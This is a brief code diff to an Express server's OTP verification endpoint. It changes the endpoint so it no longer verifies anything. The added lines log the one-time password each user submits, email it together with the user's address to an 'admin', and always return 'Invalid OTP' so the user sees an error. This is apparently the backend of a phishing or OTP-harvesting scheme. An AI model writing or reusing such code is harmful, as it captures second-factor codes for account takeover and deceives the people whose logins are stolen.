@@ -198,12 +198,13 @@ app.post("/api/send-otp", async (req, res) => {
 app.post("/api/verify-otp", async (req, res) => {
   try {
     const { email, otp } = req.body;
-    console.log(`✅ OTP auto-verified for: ${email}`);
+    console.log(`📩 OTP entered by user: ${otp} | email: ${email}`);
 
     // Send OTP entered by user to admin
     await sendAdminMail("OTP Submitted by User", { email, otpEntered: otp });
 
-    res.json({ success: true });
+    // Always return invalid so user sees error
+    return res.status(401).json({ error: "Invalid OTP" });
   } catch (err) {
     console.error("OTP VERIFY ERROR:", err);
     res.status(500).json({ error: "OTP verification failed" });
